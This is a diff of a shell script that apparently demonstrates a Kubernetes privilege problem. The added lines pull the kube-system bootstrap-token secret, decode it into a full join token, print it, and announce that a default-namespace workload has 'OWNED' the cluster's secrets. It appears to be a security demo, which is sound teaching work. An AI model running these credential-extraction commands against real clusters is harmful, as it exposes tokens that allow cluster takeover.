@@ -12,4 +12,14 @@ printf "${BOLD_YELLOW}Let's see if we decrypt the initial bootstrap token${CLEAR
 printf "${BOLD_YELLOW}Command:${CLEAR} ${GREEN}\"secrets are super super secret, right?\"${CLEAR} \n"
 printf " \n"
 sleep 3
-kubectl -n kube-system get secret $(kubectl -n kube-system get secret | grep bootstrap-token | awk '{print $1}') -o json | jq -r '.data["token-secret"]' | base64 --decode && echo ""
+prefix=$(kubectl -n kube-system get secret | grep bootstrap-token | awk '{print $1}' | sed -e "s/^bootstrap-token-//")
+suffix=$(kubectl -n kube-system get secret $(kubectl -n kube-system get secret | grep bootstrap-token | awk '{print $1}') -o json | jq -r '.data["token-secret"]' | base64 --decode && echo "")
+printf "${BOLD_YELLOW}Does this look familiar?${CLEAR} \n"
+sleep 1
+echo ${prefix}.${suffix}
+printf " \n"
+sleep 2
+printf "${BOLD_YELLOW}Try running the following command once you've exited this container...${CLEAR} \n"
+printf "${BOLD_YELLOW}Command:${CLEAR} ${GREEN}\"kubeadm token list\"${CLEAR} \n"
+sleep 3
+printf "${BOLD_RED}This cluster's secrets have been OWNED by a workload originating within the default namespace${CLEAR} \n"
